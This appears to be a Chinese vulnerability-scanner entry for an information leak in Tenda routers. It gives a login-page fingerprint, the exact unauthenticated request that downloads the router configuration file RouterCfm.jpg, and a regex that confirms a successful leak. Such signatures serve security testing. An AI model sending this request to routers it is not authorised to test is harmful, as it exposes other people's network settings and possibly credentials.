# TendaRouterCfm.jpg配置信息泄露

TendaRouterCfm ｜ 信息泄露 ｜ —
- **指纹**：`title="Tenda | LOGIN"`
- **请求**：`GET /cgi-bin/DownloadCfg/RouterCfm.jpg HTTP/1.1`
- **响应特征**：200 ^(?=.*?dhcp)(?=.*?device).*?$